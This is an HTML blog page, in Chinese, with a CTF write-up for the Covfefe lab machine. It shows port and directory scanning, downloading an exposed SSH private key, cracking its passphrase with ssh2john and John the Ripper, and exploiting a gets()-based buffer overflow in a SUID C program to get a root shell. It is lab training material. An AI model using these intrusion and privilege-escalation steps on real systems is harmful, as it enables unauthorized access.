@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>CTF-Covfefe_WriteUp，通过SSH私钥泄露再到程序溢出提权得到Flag | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CTF-Covfefe_WriteUp，通过SSH私钥泄露再到程序溢出提权得到Flag</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 26, 2019&nbsp;&nbsp;20:19:22</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26524701&auto=1&height=66"></iframe>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/827.png" alt="图片"></p>
+<p>靶场作者：<code>@_timk</code><br>操作系统：<code>Linux</code><br>任务：拿到 <code>/root/flag.txt</code><br>靶场 IP：<code>10.10.10.135</code></p>
+<h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p>利用 <code>Join the Rippe</code> 的 <code>ssh2john</code> 破解<code>SSH</code>私钥</p>
+<p>通过简单的代码审计<code>C语言</code>程序来<code>溢出提权</code></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶场IP后使用<code>NMAP</code>扫描一下端口开放服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 10.10.10.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/828.png" alt="图片"></p>
+<p>通过<code>NMAP</code>扫描结果来看，他开放了：<code>22</code>（ssh）、<code>80</code>（http）、<code>31337</code>（http）三个端口，其中<code>80</code>和<code>31337</code>是<code>web</code>服务！</p>
+<p>先来看他<code>80</code>端口的<code>web</code>页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.135/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/829.png" alt="图片"></p>
+<p>在页面上并没有显示一些东西，只是一个由<code>Nginx</code>容器搭建的web页面，先扫扫它的目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.135/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/830.png" alt="图片"></p>
+<p>发现也没有什么目录和文件，那么80端口无法突破！我们换下一个<code>31337</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.135:31337</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/831.png" alt="图片"></p>
+<p>访问了<code>web</code>后发现是由<code>Apache</code>搭建的网站，我们继续扫扫目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.135:31337</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/832.png" alt="图片"></p>
+<p>这个时候发现了几个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+ http://10.10.10.135:31337/.bash_history (CODE:200|SIZE:188)                  </span><br><span class="line">+ http://10.10.10.135:31337/.bashrc (CODE:200|SIZE:3526)                       </span><br><span class="line">+ http://10.10.10.135:31337/.profile (CODE:200|SIZE:675)                       </span><br><span class="line">+ http://10.10.10.135:31337/.ssh (CODE:200|SIZE:43)                            </span><br><span class="line">+ http://10.10.10.135:31337/robots.txt (CODE:200|SIZE:70)    </span><br></pre></td></tr></table></figure>
+
+<p>其中访问 <code>robots.txt</code> 后发现了这些，也正如上图扫描出来的文件内容！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/833.png" alt="图片"></p>
+<p>打开 <code>taxes</code> 后拿到了第一个 <code>Flag</code>！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good job! Here is a flag: flag1&#123;make_america_great_again&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/834.png" alt="图片"></p>
+<h2 id="SSH私钥公钥泄露"><a href="#SSH私钥公钥泄露" class="headerlink" title="SSH私钥公钥泄露"></a>SSH私钥公钥泄露</h2><p>在刚刚扫描出来的结果中，有一个 <code>.ssh</code> 的文件引起了我的注意，访问后页面上回显了 <code>ssh</code> 连接的<code>私钥</code>和<code>公钥</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.135:31337/.ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/835.png" alt="图片"></p>
+<p><code>id_rsa</code>（私钥）、<code>authorized_keys</code>（公钥，认证密钥）<code>id_rsa.pub</code>（公钥），访问以下文件可以把它们下载到本地：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.135:31337/.ssh/id_rsa</span><br><span class="line">http://10.10.10.135:31337/.ssh/authorized_keys</span><br><span class="line">http://10.10.10.135:31337/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/836.png" alt="图片"></p>
+<p>下载到本地后查看<code>公钥</code>发现用户名是 <code>simon</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/837.png" alt="图片"></p>
+<p>尝试使用 <code>私钥</code>（id_rsa）登陆 <code>SSH</code> ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa simon@10.10.10.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/838.png" alt="图片"></p>
+<h2 id="使用Join-the-Ripper的ssh2john破解SSH私钥"><a href="#使用Join-the-Ripper的ssh2john破解SSH私钥" class="headerlink" title="使用Join the Ripper的ssh2john破解SSH私钥"></a>使用Join the Ripper的ssh2john破解SSH私钥</h2><p>这个时候发现登录不进去，原因是密码不对！接下来使用 <code>ssh2john</code> 破解 <code>id_rsa</code>（私钥）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看 ssh2john 文件的路径</span><br><span class="line">locate ssh2john</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/839.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py</span><br></pre></td></tr></table></figure>
+
+<p>然后把 <code>ssh2john.py</code> 复制到当前路径，接下来就利用 <code>ssh2john</code> 把 <code>id_rsa</code>(私钥)转换为 <code>john</code> 可识别的文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ssh2john.py id_rsa &gt; liuwx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/840.png" alt="图片"></p>
+<p>最后使用 <code>Join the Ripper</code> 来破解 <code>liuwx</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john liuwx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/841.png" alt="图片"></p>
+<p>破解成功，密码为：<code>starwars</code> !</p>
+<p>拿到密码后进行<code>SSH</code> 连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa simon@10.10.10.135</span><br><span class="line">user：simon</span><br><span class="line">pass：starwars</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/842.png" alt="图片"></p>
+<p>登陆成功后，我切换到 <code>/root</code> 目录下发现了 <code>flag.txt</code> ，但是查看不了它的内容：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/843.png" alt="图片"></p>
+<p>权限太小了所以不能查看 <code>flag.txt</code> 文件！</p>
+<h2 id="软件溢出提权"><a href="#软件溢出提权" class="headerlink" title="软件溢出提权"></a>软件溢出提权</h2><p>我们先来查找一下那些文件是 <code>root</code> 权限的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">注释：</span><br><span class="line">	find / 从根目录查找</span><br><span class="line">    -perm -4000 具有执行权限的文件</span><br><span class="line">    2&gt;/dev/null 避免输出错误</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/844.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/local/bin/read_message</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure>
+
+<p>通过搜索 <code>root</code> 权限的文件我们可以查看到 <code>read_message</code> ，是不是似曾相识？对，就是 <code>/home</code> 目录下的 <code>read_message.c</code> 文件！通过查看 <code>read_message.c</code> 文件发现是一段由 <code>C 语言</code>编写的程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat read_message.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/845.png" alt="图片"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// You&#x27;re getting close! Here&#x27;s another flag:</span></span><br><span class="line"><span class="comment">// flag2&#123;use_the_source_luke&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> program[] = <span class="string">&quot;/usr/local/sbin/message&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span> authorized[] = <span class="string">&quot;Simon&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What is your name?\n&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only compare first five chars to save precious cycles:</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(authorized, buf, <span class="number">5</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello %s! Here is your message:\n\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">// This is safe as the user can&#x27;t mess with the binary location:</span></span><br><span class="line">        execve(program, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sorry %s, you&#x27;re not %s! The Internet Police have been informed of this violation.\n&quot;</span>, buf, authorized);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/846.png" alt="图片"></p>
+<p>通过代码审计得到了 flag2 为：<code>flag2&#123;use_the_source_luke&#125;</code>，其中代码的意思就是：使用 <code>strncmp</code>函数来<code>比较</code>输入的内容数组 <code>authorized</code>（Simon）而且字符为<code>5</code>，第三个参数 <code>buf</code> 是数组，也就是说最大字符<code>不能超过20</code>，如果等于 authorized（Simon）并且字符<code>不超过20</code>那么就 <code>printf</code> 打印出以下内容：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/847.png" alt="图片"></p>
+<p>如果输出不等于 <code>authorized</code> ，则 <code>printf</code> 输出以下内容：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/848.png" alt="图片"></p>
+<p>而最终通过<code>代码审计</code>，<code>buf</code> 不能超过<code>20</code>个字符，超过了就可以利用 <code>execve</code> 函数来让我们进行<code>溢出</code>得到 <code>root</code> 权限，具体的是输入正确的 <code>Simon</code>然后后面随便输入字符<code>超过20</code>个字符然后进入到 <code>program</code> 目录，我们可以替换为 <code>/bin/sh</code> ：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/849.png" alt="图片"></p>
+<p>最终通过溢出提权为 <code>root</code> 拿到 <code>flag</code>！</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过<code>SSH</code>私钥泄露，利用<code>Join the Ripper</code>来破解私钥登陆<code>SSH</code>,最终代码审计<code>read_message.c</code>程序利用<code>溢出提权</code>得到<code>root</code>拿到<code>flag</code>!</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/12/26/CTF-Covfefe/">http://example.com/2019/12/26/CTF-Covfefe/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83/"># 溢出提权</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/27/CTF-Vtcsec/">CTF-Vtcsec_WriteUp，ProFTPD软件后门未授权访问提权拿到Flag</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/22/CTF-Lazysysadmin/">CTF-Lazysysadmin-WriteUP，通过SMB空密码泄露铭感文件再到Wordpress获取Shell拿到Flag</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
